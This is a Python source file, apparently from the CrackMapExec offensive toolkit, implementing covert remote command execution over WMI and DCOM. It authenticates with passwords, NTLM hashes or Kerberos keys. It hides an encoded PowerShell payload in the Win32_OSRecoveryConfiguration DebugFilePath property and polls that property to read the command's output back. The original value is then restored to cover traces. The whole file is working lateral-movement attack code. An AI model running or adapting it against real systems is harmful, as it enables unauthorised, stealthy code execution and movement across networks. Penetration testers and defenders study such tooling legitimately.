import logging
from gevent import sleep
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate


class WMI(object):
    def __init__(self, dcom=None, iWbemServices=None):
        self.iWbemServices = iWbemServices
        self.dcom = dcom

        if not iWbemServices and not dcom:
            logging.debug('Creating new DCOM connection')
            self.dcom = DCOMConnection(
                self.target, self.username, self.password,
                self.domain, self.lmhash, self.nthash,
                self.aesKey, oxidResolver=True, doKerberos=self.doKerberos
            )

        if not iWbemServices:
            logging.debug("Creating new iWbemServices instance")
            iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            self.iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()
        else:
            logging.debug("Piggybacking over existing DCOM connection")

    def run(self):
        compressed_payload = ps_deflate_and_encode(self.payload)

        records = self.read()
        self.write(records, compressed_payload)
        self.execute_command(self.command)
        self.get_output(compressed_payload)
        self.write(records)

        if self.dcom:
            self.dcom.disconnect()
        return self.outputBuffer

    def read(self, query="Select * From Win32_OSRecoveryConfiguration"):
        records = []

        iEnumWbemClassObject = self.iWbemServices.ExecQuery(query)
        while True:
            try:
                pEnum = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                records.append(pEnum.getProperties())
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        iEnumWbemClassObject.RemRelease()

        return records

    def write(self, records, payload="%SystemRoot%\MEMORY.DMP", attribute='DebugFilePath', wmi_class='Win32_OSRecoveryConfiguration'):

        def autoconvert(v):
            type_dict = {
                'string': str,
                'uint32': int,
                'bool': bool
            }

            return type_dict[v['stype']](v['value'])

        try:
            activeScript, _ = self.iWbemServices.GetObject(wmi_class)
            activeScript = activeScript.SpawnInstance()
            for record in records:
                for k, v in record.iteritems():
                    setattr(activeScript, k, autoconvert(v))

            if payload:
                setattr(activeScript, attribute, payload)

            logging.debug("activeScript.DebugFilePath: {}...".format(activeScript.DebugFilePath[:50]))
            #with open('payload.debug', 'w') as p:
            #    p.write(activeScript.DebugFilePath)

            resp = self.iWbemServices.PutInstance(activeScript.marshalMe())

            if resp.GetCallStatus(0) != 0:
                logging.debug('Writing payload to {}.{} - ERROR (0x{})'.format(wmi_class, attribute, resp.GetCallStatus(0)))
                return False
            else:
                logging.debug('Writing payload to {}.{} - OK'.format(wmi_class, attribute))
                return True

        except Exception as e:
            logging.debug('Error in write_wmi_property: {}'.format(e))

        return False

    def get_output(self, compressed_payload):
        if self.retOutput is False:
            return

        while True:
            records = self.read("Select DebugFilePath from Win32_OSRecoveryConfiguration")
            if records[0]['DebugFilePath']['value'][:20] != compressed_payload[:20]:
                self.outputBuffer = ps_decode_and_inflate(records[0]['DebugFilePath']['value'])
                return
            sleep(4)
